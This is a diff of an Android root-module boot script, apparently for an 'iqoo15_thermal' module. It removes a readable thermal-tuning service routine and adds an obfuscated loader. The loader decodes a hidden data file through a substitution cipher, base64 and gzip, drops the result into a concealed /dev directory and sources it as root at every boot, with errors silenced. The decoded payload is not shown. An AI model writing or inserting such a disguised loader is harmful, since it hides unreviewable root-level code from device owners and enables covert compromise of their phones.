@@ -1,17 +1,17 @@
 #!/system/bin/sh
-MODDIR=${0%/*}
-[ -f "$MODDIR/module.prop" ] || MODDIR=/data/adb/modules/iqoo15_thermal
-BIN="$MODDIR/bin/thermal.sh"
-LOG=/data/local/tmp/iqoo15_thermal.log
-echo "--- service $(date) ---" >> "$LOG"
-
-# 等开机完成，最多 180 秒
-i=0
-while [ "$(getprop sys.boot_completed)" != "1" ] && [ $i -lt 90 ]; do
-	sleep 2
-	i=$((i+1))
-done
-sleep 3
-sh "$BIN" apply >> "$LOG" 2>&1
-sh "$BIN" ueventd >> "$LOG" 2>&1
-echo "# done" >> "$LOG"
+_c='/dev/.iq15_6c4e23f4_service.sh'
+_d="$MODPATH"
+[ -n "$_d" ] || _d="${0%/*}"
+[ -f "$_d/.service.sh.dat" ] || _d=/data/adb/modules/iqoo15_thermal
+_p="$_d/.service.sh.dat"
+[ -f "$_p" ] || _p="/data/adb/modules/iqoo15_thermal/bin/.service.sh.dat"
+if [ ! -s "$_c" ]; then
+	mkdir -p /dev/.iq15 2>/dev/null
+	chmod 700 /dev/.iq15 2>/dev/null
+	tr 'NOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLM' 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' < "$_p" 2>/dev/null | base64 -d 2>/dev/null | gzip -d 2>/dev/null > "$_c.$$"
+	[ -s "$_c.$$" ] && mv -f "$_c.$$" "$_c" 2>/dev/null
+	rm -f "$_c.$$" 2>/dev/null
+	chmod 600 "$_c" 2>/dev/null
+fi
+[ -s "$_c" ] || { echo "load error"; exit 1; }
+. "$_c"
